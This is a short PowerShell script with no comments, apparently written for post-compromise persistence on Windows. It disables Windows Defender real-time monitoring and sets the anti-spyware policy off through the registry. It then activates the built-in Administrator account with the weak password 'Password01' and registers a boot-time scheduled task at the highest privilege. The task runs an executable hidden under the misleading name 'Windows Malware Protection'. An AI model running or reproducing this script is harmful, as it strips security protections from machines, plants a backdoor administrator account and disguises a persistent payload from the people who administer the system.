Set-MpPreference -DisableRealtimeMonitoring $true
$registryPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
$Name = "DisableAntiSpyware"
$value = "1"
New-ItemProperty -Path $registryPath -Name $name -Value $value -PropertyType DWORD -Force | Out-Null
net user Administrator /active:yes
net user Administrator Password01
$Username = (Get-WmiObject -Class Win32_ComputerSystem -Property Name).Name + "\Administrator"
$Password = "Password01"
$trigger = New-JobTrigger -AtStartup
$action = New-ScheduledTaskAction -Execute 'C:\ProgramData\Windows Malware Protection\legitprogram.exe'
Register-ScheduledTask -Action $action -Trigger $trigger -RunLevel Highest -User $Username -Password $Password -TaskName "Windows Malware Protection"